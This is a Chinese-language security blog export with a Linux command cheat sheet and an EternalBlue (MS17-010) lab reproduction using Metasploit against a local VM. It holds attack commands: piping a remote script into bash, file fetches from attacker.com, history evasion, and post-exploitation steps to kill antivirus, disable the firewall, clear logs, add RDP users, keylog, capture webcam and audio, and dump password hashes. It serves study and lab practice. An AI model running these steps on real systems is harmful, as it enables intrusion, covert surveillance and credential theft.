<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version</span><br><span class="line">Linux version 5.5.13-arch2-1 (linux@archlinux) (gcc version 9.3.0 (Arch Linux 9.3.0-1)) #1 SMP PREEMPT Mon, 30 Mar 2020 20:42:41 +0000</span><br></pre></td></tr></table></figure>
<p>uname -a</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux sds0 5.5.13-arch2-1 #1 SMP PREEMPT Mon, 30 Mar 2020 20:42:41 +0000 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>
<p>lsb_release -a</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">LSB Version:    1.4</span><br><span class="line">Distributor ID: Arch</span><br><span class="line">Description:    Arch Linux</span><br><span class="line">Release:        rolling</span><br><span class="line">Codename:       n&#x2F;a</span><br></pre></td></tr></table></figure>
<p>cat /etc/issue</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">Arch Linux \r (\l)</span><br></pre></td></tr></table></figure>

<h3 id="curl-部分用法"><a href="#curl-部分用法" class="headerlink" title="curl 部分用法"></a>curl 部分用法</h3><p>模拟浏览器发送get请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
<p>发送POST请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;flagpls&#x3D;flagpls&quot; http:&#x2F;&#x2F;ip</span><br></pre></td></tr></table></figure>
<p><strong>在浏览器开发者工具存储器中可设置cookie</strong></p>
<p>获取可进行的请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;..... -X OPTIONS -v</span><br></pre></td></tr></table></figure>

<p>设置User-agent，不设置ua默认的是curl/curl的版本号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line"></span><br><span class="line">那么怎么设置呢？</span><br><span class="line"> -A, --user-agent &lt;name&gt; Send User-Agent &lt;name&gt; to server</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl www.baidu.com -A <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'</span></span><br></pre></td></tr></table></figure>

<p>如果抓包的话就会发现请求包头的UA字段变成了上面那个了。</p>
<h3 id="wget部分用法"><a href="#wget部分用法" class="headerlink" title="wget部分用法"></a>wget部分用法</h3><p>wget设置UA下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --user-agent&#x3D;&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;76.0.3809.132 Safari&#x2F;537.36&quot; url</span><br></pre></td></tr></table></figure>



<h3 id="python打开tty"><a href="#python打开tty" class="headerlink" title="python打开tty"></a>python打开tty</h3><a href="https://cloud.tencent.com/developer/article/1047405" title="" target="">如何将简单的Shell转换成为完全交互式的TTY</a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<h3 id="没有python怎么打开tty"><a href="#没有python怎么打开tty" class="headerlink" title="没有python怎么打开tty?"></a>没有python怎么打开tty?</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash script -q &#x2F;dev&#x2F;null</span><br><span class="line">Ctrl-Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure>

<h3 id="python部署简易网站"><a href="#python部署简易网站" class="headerlink" title="python部署简易网站"></a>python部署简易网站</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer # 不指定端口默认8000</span><br><span class="line">python -m http.server</span><br><span class="line">python3 -m updog --ssl --password 123456 -p 80 #不是自带库，需要安装。</span><br></pre></td></tr></table></figure>

<h3 id="curl-wget-不验证证书进行https请求"><a href="#curl-wget-不验证证书进行https请求" class="headerlink" title="curl wget 不验证证书进行https请求"></a>curl wget 不验证证书进行https请求</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget &#39;https:&#x2F;&#x2F;x.x.x.x&#x2F;get_ips&#39; --no-check-certificate</span><br><span class="line">curl &#39;https:&#x2F;&#x2F;x.x.x.x&#x2F;get_ips&#39; -k</span><br></pre></td></tr></table></figure>

<h3 id="设置term"><a href="#设置term" class="headerlink" title="设置term"></a>设置term</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export TERM&#x3D;xterm</span><br></pre></td></tr></table></figure>

<h3 id="Arch-查询滚了多少次-…"><a href="#Arch-查询滚了多少次-…" class="headerlink" title="Arch 查询滚了多少次(…)"></a>Arch 查询滚了多少次(…)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $(head -n1 &#x2F;var&#x2F;log&#x2F;pacman.log | cut -d &quot; &quot; -f 1,2) 以来一共滚了 $(grep -c &quot;full system upgrade&quot; &#x2F;var&#x2F;log&#x2F;pacman.log) 次</span><br></pre></td></tr></table></figure>

<h3 id="渗透过程中不记录历史命令"><a href="#渗透过程中不记录历史命令" class="headerlink" title="渗透过程中不记录历史命令"></a>渗透过程中不记录历史命令</h3><p><code>export HISTFILE=/dev/null</code> 将HISTFILE设置为/dev/null</p>
<p><code>cat | zsh</code>隐身模式。</p>
<p>避免登录被记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@127.0.0.1 sh</span><br></pre></td></tr></table></figure>

<h3 id="无文件落地执行"><a href="#无文件落地执行" class="headerlink" title="无文件落地执行"></a>无文件落地执行</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L http://aaaa.com/a.sh|bash</span><br><span class="line">/bin/bash -c <span class="string">"<span class="variable">$(curl -fsSL https://aaaa/a.sh)</span>"</span></span><br></pre></td></tr></table></figure>

<h3 id="Dos格式文件快速转为Unix"><a href="#Dos格式文件快速转为Unix" class="headerlink" title="Dos格式文件快速转为Unix"></a>Dos格式文件快速转为Unix</h3><p>使用vi</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:set fileformat&#x3D;unix</span><br><span class="line">:w</span><br></pre></td></tr></table></figure>

<p>dos2unix</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dos2unix filename</span><br></pre></td></tr></table></figure>

<h3 id="Linux使用impakcet快速开启一个SMB共享目录"><a href="#Linux使用impakcet快速开启一个SMB共享目录" class="headerlink" title="Linux使用impakcet快速开启一个SMB共享目录"></a>Linux使用<code>impakcet</code>快速开启一个SMB共享目录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 /usr/share/doc/python3-impacket/exapmles/smbserver.py -comment <span class="string">"My Share"</span> TMP /tmp</span><br></pre></td></tr></table></figure>

<h3 id="PIP下载文件"><a href="#PIP下载文件" class="headerlink" title="PIP下载文件"></a>PIP下载文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export URL&#x3D;http:&#x2F;&#x2F;attacker.com&#x2F;file_to_get</span><br><span class="line"></span><br><span class="line">export LFILE&#x3D;&#x2F;tmp&#x2F;file_to_save</span><br><span class="line"></span><br><span class="line">TF&#x3D;\$(mktemp -d)</span><br><span class="line"></span><br><span class="line">echo &#39;import sys; from os import environ as e</span><br><span class="line"></span><br><span class="line">if sys.version_info.major &#x3D;&#x3D; 3: import urllib.request as r</span><br><span class="line"></span><br><span class="line">else: import urllib as r</span><br><span class="line"></span><br><span class="line">r.urlretrieve(e[&quot;URL&quot;], e[&quot;LFILE&quot;])&#39; \&gt; \$TF&#x2F;setup.py</span><br><span class="line"></span><br><span class="line">pip install \$TF</span><br></pre></td></tr></table></figure>

<h3 id="whois传输文件"><a href="#whois传输文件" class="headerlink" title="whois传输文件"></a>whois传输文件</h3><p>攻击机执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lp 12345 &lt; &quot;abc&quot;</span><br><span class="line"></span><br><span class="line">## 传递二进制文件</span><br><span class="line">base64 &quot;file_to_send&quot; \| nc -l -p 12345</span><br></pre></td></tr></table></figure>

<p>靶机执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RHOST&#x3D;attacker.com</span><br><span class="line">RPORT&#x3D;12345</span><br><span class="line">LFILE&#x3D;file_to_save</span><br><span class="line">whois -h \$RHOST -p \$RPORT \&gt; &quot;\$LFILE&quot;</span><br></pre></td></tr></table></figure>

<h3 id="切换java版本"><a href="#切换java版本" class="headerlink" title="切换java版本"></a>切换java版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br></pre></td></tr></table></figure>

<h3 id="编译32位且动态链接库文件很老的二进制文件"><a href="#编译32位且动态链接库文件很老的二进制文件" class="headerlink" title="编译32位且动态链接库文件很老的二进制文件"></a>编译32位且动态链接库文件很老的二进制文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -Wl,--<span class="built_in">hash</span>-style=both -m32 -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure>



<h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><p>如果用ssh连接服务器，在ssh连接中断后，在ssh下开启的后台命令什么的都会被中断掉。但是有时候会有些任务持续的时间很长，那么可以使用nohup命令. 该命令可以在你退出帐户/关闭终端之后继续运行相应的进程. nohup就是不挂起的意思。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nohup tcpdump -i eth0 -w a.pcap &amp;</span><br></pre></td></tr></table></figure>

<p>之后tcpdump用户就会执行这个进程，在你ssh会话挂了之后此任务还会继续进行。</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MS17-010复现-部分后渗透指令</title>
    <url>/2020/04/14/MS17-010%E5%A4%8D%E7%8E%B0-%E9%83%A8%E5%88%86%E5%90%8E%E6%B8%97%E9%80%8F%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>对永恒之蓝漏洞的一个复现 <br /> </p>
<p>不适合人类阅读，非常水的自我笔记</p>
<p>靶机难度：十分简单</p>
<a id="more"></a>

<ul>
<li>靶机:<br /> Windows Server 2008 <br /> </li>
</ul>
<p>192.168.1.84</p>
<ul>
<li>攻击机:<br /> Kali 2019.04 <br /> 192.168.1.83</li>
</ul>
<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><p>先扫描当前网段存活的主机，可以使用<code>nmap</code>,也可以使用<code>netdiscover</code>,<code>arp-scan</code>等工具。</p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>nmap -sn -PR 192.168.1.0/24</p>
<p>使用此命令会使用nmap的arp ping扫描模式来发现存活主机<br><a href="https://nmap.org/man/zh/man-host-discovery.html" target="_blank" rel="noopener">官方解释</a></p>
<blockquote>
<p>最常见的Nmap使用场景之一是扫描一个以太局域网。 在大部分局域网上，特别是那些使用基于 RFC1918私有地址范围的网络，在一个给定的时间绝大部分 IP地址都是不使用的。 当Nmap试图发送一个原始IP报文如ICMP回声请求时， 操作系统必须确定对应于目标IP的硬件 地址(ARP)，这样它才能把以太帧送往正确的地址。 这一般比较慢而且会有些问题，因为操作系统设计者认为一般不会在短时间内 对没有运行的机器作几百万次的ARP请求。<br>当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。 当它收到响应时， Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。 所以默认情况下，如果Nmap发现目标主机就在它所在的局域网上，它会进行ARP扫描。 即使指定了不同的ping类型(如 -PI或者 -PS) ，Nmap也会对任何相同局域网上的目标机使用ARP。 如果您真的不想要ARP扫描，指定 –send-ip。<br>nmap -sP 192.168.1.0/24<br>你也可以使用这条命令，在特权用户下，会默认发送ARP包探测。</p>
</blockquote>
<h4 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h4><p>arp-scan –interface=eth1 –localnet</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20191210_163742_ms17_010_arp_scan.png" alt="arp_scan"></p>
<h3 id="探测主机服务"><a href="#探测主机服务" class="headerlink" title="探测主机服务"></a>探测主机服务</h3><p>探测主机开放来什么端口以及服务</p>
<p>nmap -sS -A -sV -T4 192.168.1.aa</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20191210_170017_ms17_010_nmap_port_scan.png" alt="nmap_scan_report"></p>
<p>发现是Windows系统，并发现开发了445端口，可以尝试是否可以利用ms17_010漏洞。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以先使用<code>auxiliary/scanner/smb/smb_ms17_010</code>模块来看主机是否合适使用ms17漏洞</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20191210_184912_ms17_010_scanner_ms17.png" alt="exp"><br>使用辅助模块扫描</p>
<p>可以看到以下语句的结果出现，说明该主机很容易受到ms17_010漏洞的攻击。</p>
<blockquote>
<p>[+] 192.168.1.84:445      - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7600 x64 (64-bit)</p>
</blockquote>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20191210_185233_msfconsole_ms17010_run.png" alt="exp-1"><br>设置参数并进行攻击<br>默认的payload是默认反弹到cmdshell，所以可以设置payload反弹到meterpreter以便后续的渗透。</p>
<p>参数说明</p>
<ul>
<li>rhosts 目标IP</li>
<li>lhost 攻击机的ip</li>
<li>port 端口</li>
</ul>
<p>出现meterpreter的shell之后，就说明我们的攻击成功来，接下来就要进行设置后门，维持权限等操作了。</p>
<h3 id="拿到cmd-shell后乱码"><a href="#拿到cmd-shell后乱码" class="headerlink" title="拿到cmd shell后乱码"></a>拿到cmd shell后乱码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>

<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="进程转移"><a href="#进程转移" class="headerlink" title="进程转移"></a>进程转移</h3><p>可以在<code>meterpreter</code>中使用<code>migrate</code>进行手动转移</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; migrate 1904</span><br><span class="line">[*] Migrating from 1160 to 1904...</span><br><span class="line">[*] Migration completed successfully.</span><br></pre></td></tr></table></figure>
<p>也可以使用<code>run post/windows/manage/migrate</code>进行自动转移</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-L7LB8P6KDBM</span><br><span class="line">[*] Current server process: Dwm.exe (1904)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 2636</span><br><span class="line">[+] Successfully migrated to process 2636</span><br></pre></td></tr></table></figure>

<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysinfo  #查看系统信息</span><br><span class="line">getuid #当前用户 </span><br><span class="line">getpid #当前进程ID</span><br><span class="line">ps #所有进程</span><br><span class="line">shell #进入目标机的shell</span><br><span class="line">sessions #查看已经成功获取的会话</span><br><span class="line">sessions -i &lt;id&gt; #进入会话 -h 帮助 -k 杀死会话</span><br><span class="line">backgroup #将当前会话放置到后台</span><br><span class="line">info #查看模块信息</span><br><span class="line">run #执行已有的模块</span><br><span class="line">idletiome #查看目标机器闲置时间</span><br><span class="line">reboot &amp; shutdown #重启 关机</span><br></pre></td></tr></table></figure>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getwd &amp; pwd #查看当前目录</span><br><span class="line">ls &amp; dir #列出当前目录的文件</span><br><span class="line">cd #切换目录</span><br><span class="line">search -f *.txt -d c:\ #搜索在C驱动器的文件类型为txt的文件</span><br><span class="line">cat #查看文件内容</span><br><span class="line">upload #上传本地文件到目标</span><br><span class="line">download #下载目标文件到本地</span><br><span class="line">edit #编辑文件</span><br><span class="line">rm #删除文件</span><br><span class="line">mkdir #创建目录</span><br><span class="line">rmdir #删除目录</span><br><span class="line">getlwd &amp; lpwd #查看攻击机本地目录</span><br><span class="line">lcd #切换攻击机本地目录</span><br></pre></td></tr></table></figure>

<h3 id="执行文件"><a href="#执行文件" class="headerlink" title="执行文件"></a>执行文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe #创建新进程cmd.exe -H 不可见 -i 可交互</span><br></pre></td></tr></table></figure>

<h3 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">clearev&#x2F;clearav #现在是claerev 不过以前的版本好像是clearav</span><br></pre></td></tr></table></figure>

<h3 id="timestomp-伪造时间"><a href="#timestomp-伪造时间" class="headerlink" title="timestomp 伪造时间"></a>timestomp 伪造时间</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">timestomp C:&#x2F;&#x2F; -h #查看帮助</span><br><span class="line">timestomp -v C:&#x2F;&#x2F;2.txt  #查看2.txt的时间戳</span><br><span class="line">timestomp C:&#x2F;&#x2F;2.txt -f C:&#x2F;&#x2F;1.txt #将2的时间戳复制给1.txt</span><br></pre></td></tr></table></figure>

<h3 id="基本网络命令"><a href="#基本网络命令" class="headerlink" title="基本网络命令"></a>基本网络命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig&#x2F;ifconfig</span><br><span class="line">netstat -ano #查看端口</span><br><span class="line">arp #查看arp缓存表</span><br><span class="line">getproxy #查看代理信息</span><br><span class="line">route #查看路由</span><br></pre></td></tr></table></figure>

<h4 id="添加代理"><a href="#添加代理" class="headerlink" title="添加代理"></a>添加代理</h4><p>先添加路由映射.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br><span class="line">run autoroute -s 192.168.56.0&#x2F;24</span><br></pre></td></tr></table></figure>
<p>然后使用 socks4a 模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br></pre></td></tr></table></figure>
<p>配置好后,直接run.之后就在kali中设置代理127.0.0.1 1080.</p>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>除了用<code>portfwd</code>外同样也可以使用<code>enable_edp</code>和<code>getgui</code>实际上<code>enable_rdp</code>的添加端口，就是使用了<code>portfwd</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run portfwd add -l 8888 -p 3389 -r 127.0.0.1 #将目标的3389转发到本地的8888端口</span><br><span class="line">run getgui -f 6662 -e #端口转发</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6666 #端口转发</span><br></pre></td></tr></table></figure>

<h4 id="autoroute添加路由"><a href="#autoroute添加路由" class="headerlink" title="autoroute添加路由"></a>autoroute添加路由</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run autoroute -h #查看帮助</span><br><span class="line">run autoroute -s 192.168.56.0&#x2F;24 #添加到目标环境网络</span><br><span class="line">run autoroute -p #查看添加的路由</span><br></pre></td></tr></table></figure>

<p>autoroute已经是旧的命令了,新版msf已经建议使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute  # 添加路由转发</span><br></pre></td></tr></table></figure>

<p>然后可以利用<code>arp_scanner</code>,<code>portscan</code>等进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner rhosts&#x3D;192.168.56.0&#x2F;24</span><br><span class="line">run auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp rhosts&#x3D;192.168.56.102 ports&#x3D;22</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h3 id="local-exploit-suggester"><a href="#local-exploit-suggester" class="headerlink" title="local_exploit_suggester"></a>local_exploit_suggester</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br></pre></td></tr></table></figure>

<h4 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h4><p>getsystem工作原理:</p>
<blockquote>
<p>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br />②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br />③Windows服务已启动，导致与命名管道建立连接。<br />④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br />然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
</blockquote>
<h4 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a>bypassuac</h4><p>运行后返回一个新的会话，再用<code>getsystem</code>提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">use windows&#x2F;local&#x2F;bypassuac_vbs</span><br><span class="line">use windows&#x2F;local&#x2F;ask</span><br></pre></td></tr></table></figure>

<h4 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h4><p>先使用<code>run post/windows/gather/enum_patches  #查看补丁信息</code>然后看缺少哪个补丁，就利用那个补丁的漏洞进行攻击</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机</span><br><span class="line">run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #查看分区</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #获取安装软件信息</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;dumplinks   #获取最近的文件操作</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_ie  #获取IE缓存</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome   #获取Chrome缓存</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #补丁信息</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_domain  #查找域控</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users #查看当前多少活跃用户</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump #获取系统hash值 需要使用system权限</span><br></pre></td></tr></table></figure>

<h4 id="scraper"><a href="#scraper" class="headerlink" title="scraper"></a>scraper</h4><p>这个脚本会收集目标机器上的常见信息，然后将它们下载保存在本地。这个脚本还可以加入自定义的命令。<br />只需执行<code>run scraper</code>即可运行脚本。<br /><code>/.msf4/logs/</code>下保存了所有脚本需要保存的日志记录，当然不只这一个脚本。同样.msf4文件夹下还保存了其他东西，比如输入过的命令，msf运行过程的日志等。 Scraper脚本将保存结果在<code>/.msf4/logs/scripts/scraper/</code>下。</p>
<h4 id="查看目标主机是否是虚拟机"><a href="#查看目标主机是否是虚拟机" class="headerlink" title="查看目标主机是否是虚拟机"></a>查看目标主机是否是虚拟机</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;checkvm</span><br><span class="line"></span><br><span class="line">[*] Checking if WIN-L7LB8P6KDBM is a Virtual Machine .....</span><br><span class="line">[+] This is a Sun VirtualBox Virtual Machine</span><br></pre></td></tr></table></figure>
<h4 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure>

<h4 id="关闭防火墙-Cmd命令"><a href="#关闭防火墙-Cmd命令" class="headerlink" title="关闭防火墙(Cmd命令)"></a>关闭防火墙(Cmd命令)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>


<h4 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a>开启3389</h4><p>开启远程端口并创建用户可以使用<code>getgui</code>或者是<code>enable_rdp</code>这两个其中一个脚本，但是建议使用<code>enable_rdp</code>,因为使用<code>getgui</code>有时候虽然提示是创建用户成功，但是却是无法登录的。</p>
<h5 id="enable-rdp"><a href="#enable-rdp" class="headerlink" title="enable_rdp"></a>enable_rdp</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启远程桌面</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;test PASSWORD&#x3D;!QAZ2wsx#EDC #添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6666 #端口转发</span><br></pre></td></tr></table></figure>

<h5 id="getgui"><a href="#getgui" class="headerlink" title="getgui"></a>getgui</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run getgui -h查看帮助</span><br><span class="line">run getgui -e 开启远程桌面</span><br><span class="line">run getgui -u test -p !QAZ2wsx#EDC #添加用户</span><br><span class="line">run getgui -f 6662 -e #端口转发</span><br></pre></td></tr></table></figure>

<h3 id="截图-amp-amp-截屏"><a href="#截图-amp-amp-截屏" class="headerlink" title="截图 &amp;&amp; 截屏"></a>截图 &amp;&amp; 截屏</h3><ul>
<li><code>screenshot</code></li>
<li><code>load espia #加载插件 screengrab #截图</code></li>
<li><code>run vnc</code> # 使用vnc远程桌面连接偷窥</li>
<li><code>enumdesktops</code> #查看可用的桌面</li>
<li><code>getdesktop</code> #获取与当前会话关联的桌面</li>
<li><code>set_desktop</code> #设置与当前会话关联的桌面</li>
</ul>
<h3 id="开启摄像头"><a href="#开启摄像头" class="headerlink" title="开启摄像头"></a>开启摄像头</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">webcam_list #列出目标机器的摄像头列表</span><br><span class="line">webcam_snap #打开目标机器摄像头拍摄一张照片</span><br><span class="line">webcam_stream #打开目标机器摄像头并开启直播</span><br><span class="line">record_mic #音频录制</span><br></pre></td></tr></table></figure>

<h3 id="键盘记录keyscan"><a href="#键盘记录keyscan" class="headerlink" title="键盘记录keyscan"></a>键盘记录keyscan</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keyscan_start #开启记录</span><br><span class="line">keyscan_dump #输出截获到的输入记录</span><br><span class="line">keyscan_stop #停止键盘记录</span><br></pre></td></tr></table></figure>
<p>这里需要注意一下windows会话窗口的概念，windows桌面划分为不同的会话(session)，以便于与windows交互。<br />会话0代表控制台，1，2代表远程桌面。所以要截获键盘输入必须在0中进行。<br />可以使用getdesktop查看或者截张图试试。否则使用setdesktop切换。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;capture&#x2F;keylog_recorder</span><br></pre></td></tr></table></figure>
<p>这也时获取键盘记录的命令，与<code>keyscan</code>不同的是，这个命令记录之后会同时保存到攻击者主机<code>.msf4/loot/</code>目录下</p>
<h3 id="mimikatz-kiwi获取密码"><a href="#mimikatz-kiwi获取密码" class="headerlink" title="mimikatz/kiwi获取密码"></a>mimikatz/kiwi获取密码</h3><blockquote>
<p>Windows10 和 Windows 2019更新了SAM的格式，所以一些旧工具是无法DUMP出这两个系统的HASH值。建议用mimikatz。</p>
</blockquote>
<p><a href="https://www.cnblogs.com/-mo-/p/11890232.html" target="_blank" rel="noopener">Mimikatz使用大全</a><br><a href="https://www.cnblogs.com/pursuitofacm/p/6704219.html" target="_blank" rel="noopener">神器mimikatz使用命令方法总结</a><br><a href="https://www.secpulse.com/archives/65256.html" target="_blank" rel="noopener">几种windows本地hash值获取和破解详解</a><br><a href="https://www.sqlsec.com/2019/11/winhash.html" target="_blank" rel="noopener">Windows用户密码的加密方法与破解</a></p>
